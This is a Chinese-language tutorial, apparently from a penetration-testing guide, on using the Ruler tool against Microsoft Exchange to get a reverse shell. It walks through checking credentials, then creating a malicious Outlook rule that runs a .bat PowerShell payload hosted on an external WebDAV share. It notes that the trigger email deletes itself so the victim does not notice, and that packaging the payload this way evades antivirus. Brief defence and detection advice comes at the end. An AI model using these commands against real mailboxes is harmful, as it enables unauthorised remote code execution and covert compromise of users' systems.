## Exchange服务


### 前期准备
* 安装[golang](https://github.com/golang/) 
* 安装[ruler](https://github.com/sensepost/ruler) 
* 有效的域用户凭证

-------
### 简介
Ruler是一款交互式的远程Exchange服务管理工具，其使用MAPI/HTTP或RPC/HTTP协议。主要是用来利用Outlook客户端的一些特性获取shell。

Ruler会尝试与Exchange服务连接，并使用Autodiscover服务来发现相关信息。

-------
### Ruler可以用来做些什么

Ruler可以用来做很多事情，下面将会列出它的主要功能，也将展示一种利用Ruler反弹shell的方法，仅需要一个有效的用户名和密码来登录Outlook就可以办到。这也是前面为什么我们要碰撞出有效的账户来，这对之后反弹shell非常有用。

办公少不了需要用邮箱，因为他们发文件发通知等需要。

* 枚举有效用户
* 创建新的恶意邮件规则
* 转储全局地址列表(GAL)
* 通过表单执行VBScript
* 通过Outlook主页执行VBScript

这些功能是不是很奈斯

**进攻前的检查**

关于如何查找邮件结构、添加dns记录等，这里就不详细概述了，留给读者去动手探索。

一旦我们知道了邮件的结构、如何添加了dns记录等信息，我们就可以从exchange服务器检查开始，检查我们是否能够与其通信，以及是否能够验证并打开邮箱。

下面的示例主要取决于你如何编译Ruler，不同操作可能有所不同。

`./ruler --email test@lab.local --verbose check`

执行后会提示输入密码，如果凭证有效，回看到提示说邮箱登录成功。


**查看现有规则**

`./ruler --email test@lab.local display`


**设置一个Empire会话监听**
这里不会深入探讨如何建立一个Empire或它的listener，你点击[chryzsh](https://chryzsh.gitbooks.io/darthsidious/content/responder/relay.html) 了解。我们应该生成一个.bat的powershell文件，并将其托管到webdav服务器上，而不是使用一个单例程序。

网上有很多关于如何快速建立webdav服务器的指南，细节请Google。

其价值在于可以通过压缩.bat文件，再通过webdav目录来调用，用于逃避AV检测。

以后我会更新这个方法。

**创建规则**


```
./ruler --email test@lab.local add --name test --trigger shell --location "\\\\webdav.test\\webdav\shell.bat" --send
```
这个命令的作用是发送一封电子邮件到用户邮箱并触发我们的规则。

值得一提的是用户并不会看到这个邮件，因为它会自动删除的，所以我们不必担心被发现。

**删除&清理规则**
一旦执行将删除邮箱规则！！！

```
./ruler --email test@lab.local delete --name test
```

**如何防御Ruler的攻击**

1. 为所有用户启用多因素身份验证，特别是那些具有管理权限的用户。
2. 经常检查你的账户是否有非法活动。手动或者使用安全监视工具都行。防御可能没办法做到实时，但也回尽快发现，减少损失。

**如何检测Ruler的攻击**
最简单的方法是使用微软编写的检查脚本（运行需要管理员权限）

```
https://github.com/OfficeDev/O365-InvestigationTooling/blob/master/Get-AllTenantRulesAndForms.ps1
```
**写在最后**

Ruler是一个可以在网络上找到的用来反弹shell的好工具,这里介绍到的知识冰山一角,建议读者自行去探索该工具,也可以更好的理解和体验其强大之处。






